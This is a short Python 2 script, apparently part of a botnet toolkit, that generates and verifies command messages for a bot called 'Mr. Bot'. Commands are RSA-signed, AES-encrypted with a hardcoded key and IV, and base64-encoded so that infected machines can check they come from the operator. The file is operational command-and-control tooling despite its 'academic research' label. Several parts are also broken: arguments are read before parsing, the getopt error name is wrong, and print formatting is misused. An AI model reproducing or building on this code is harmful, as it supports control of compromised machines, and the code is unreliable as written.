#!/bin/usr/env python
#
# Mr. Bot command generator (for acdemic research)
#
# Date: Nov. 4, 2012
# All rights are reserved.
# 

import sys, random, base64, getopt
from array import array
from crypto import rsa,slowaes
import ccpkt, encopt

_aes_key = [143,194,34,208,145,203,230,143,177,246,97,206,145,92,255,84]
_iv = [103,35,148,239,76,213,47,118,255,222,123,176,106,134,98,92]

def verify_msg(data, keyfile):
	try:
		print data
		msg = base64.b64decode(data)
		print msg
	except TypeError as inst:
		print str(inst)
		print "Not a Base64 encoded data."
		return data

	try:
		with open(keyfile, 'rb') as pf:
			pub = rsa.PublicKey.load_pkcs1(pf.read(), "PEM")
		msg_len = int(msg[0:4])
		cipher = array('B', msg[4:msg_len+4])
		org_len = int(msg[msg_len+4:msg_len+8])
		sig = msg[msg_len+8:]
		moo = slowaes.AESModeOfOperation()
		raw = moo.decrypt(cipher, org_len, 2, _aes_key, moo.aes.keySize["SIZE_128"], _iv)
		print("Raw %s %r.", raw, sig)
		master = rsa.verify(raw, sig, pub)
		if master:
			return raw
	except IOError:
		print "We do not have a public key."
		return data
	except ValueError:
		print "Invalid data"
		return data
	return data

def generate_msg(command, keyfile):
	print("Generating message for '%s' using '%s' ..." % (command, keyfile))
	# 0. Read private key from file
	try:
		with open(keyfile, 'rb') as f:
			pri = rsa.PrivateKey.load_pkcs1(f.read(), "PEM")
	except IOError:
		print "Error: No such key file. "
		sys.exit()

	# 1. Check the validation of command
	msg = ccpkt.build_msg(command)

	# 2. sign message and base64 encode 
	cmdsig = rsa.sign(msg, pri, "SHA-256")
	#with open('keys/mrpub.pem', 'rb') as pf:
	#	pub = rsa.PublicKey.load_pkcs1(pf.read(), "PEM")
	#master = rsa.verify(msg, cmdsig, pub)
	#if master:
	#	print("Verify sucess")
	moo = slowaes.AESModeOfOperation()
	mode, orig_len, cipher = moo.encrypt(msg, moo.modeOfOperation["CBC"], _aes_key, moo.aes.keySize["SIZE_128"], _iv)
	cipher_str = str(bytearray(cipher))
	message = str(len(cipher_str)).zfill(4) + cipher_str + str(orig_len).zfill(4) + str(cmdsig)
	b64msg = base64.b64encode(message)
	print "'", b64msg, "'"

if __name__ == "__main__":
	prikeyfile = sys.argv[1]
	command = sys.argv[2]

	try:
		opts, args = getopt.getopt(sys.argv[1:], "d:e:k:", ["decode", "encode", "keyfile"])
	except getopt.getGetoptError as err:
		print str(err)
		sys.exit(2)

	print opts, args

	data=None
	keyfile=None
	_proc=None

	for o, a in opts:
		print o, a
		if o in ("-d", "--decode"):
			data = a
			_proc=verify_msg
		elif o in ("-e", "--encode"):
			data = a
			_proc=generate_msg
		elif o in ("-k", "--keyfile"):
			keyfile = a
		else:
			print("Unhandled options ", o)
	
	if keyfile is None or data is None:
		sys.exit(2)
	
	_proc(data, keyfile)


